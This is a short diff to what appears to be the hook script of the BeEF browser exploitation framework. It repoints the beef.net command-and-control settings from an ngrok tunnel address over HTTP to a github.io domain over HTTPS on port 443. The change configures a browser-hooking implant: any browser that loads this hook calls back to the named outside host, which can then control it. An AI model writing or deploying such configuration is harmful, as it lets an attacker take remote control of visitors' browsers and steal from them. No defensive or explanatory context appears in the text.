@@ -11695,10 +11695,10 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "native-fully-elephant.ngrok-free.app",
-    port: "80",
+    host: "totallylost-helpme.github.io",
+    port: "443",
     hook: "/hook.js",
-    httpproto: "http",
+    httpproto: "https",
     handler: '/dh',
     chop: 500,
     pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
